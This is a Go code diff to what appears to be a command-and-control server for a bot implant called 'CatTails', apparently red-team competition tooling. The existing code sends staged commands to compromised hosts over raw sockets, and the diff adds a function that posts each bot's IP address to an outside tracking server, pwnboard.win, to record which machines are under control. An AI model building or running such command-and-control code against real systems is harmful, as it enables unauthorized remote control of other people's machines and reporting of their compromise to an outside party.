@@ -2,9 +2,12 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"log"
 	"net"
+	"net/http"
 	"os"
 	"strings"
 
@@ -21,6 +24,12 @@ type Host struct {
 	Hostname string
 	Mac      net.HardwareAddr
 	IP       net.IP
+}
+
+// PwnBoard is used for updating pwnboard
+type PwnBoard struct {
+	IPs  string
+	Type string
 }
 
 // sendCommand takes
@@ -42,6 +51,9 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
 			// Close the socket
 			unix.Close(fd)
+			go updatepwnBoard(bot)
+		} else {
+			go updatepwnBoard(bot)
 		}
 	}
 }
@@ -80,6 +92,26 @@ func cli() {
 		stagedCmd = strings.Trim(stagedCmd, "\n")
 		fmt.Println("[+] Staged CMD:", stagedCmd)
 	}
+}
+
+// Update pwnboard
+func updatepwnBoard(bot Host) {
+	url := "http://pwnboard.win/generic"
+
+	// Create the struct
+	data := PwnBoard{
+		IPs:  bot.IP.String(),
+		Type: "CatTails",
+	}
+
+	// Marshal the data
+	sendit, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("\n[-] ERROR SENDING POST:", err)
+	}
+
+	// Send the post to pwnboard
+	http.Post(url, "application/json", bytes.NewBuffer(sendit))
 }
 
 func main() {
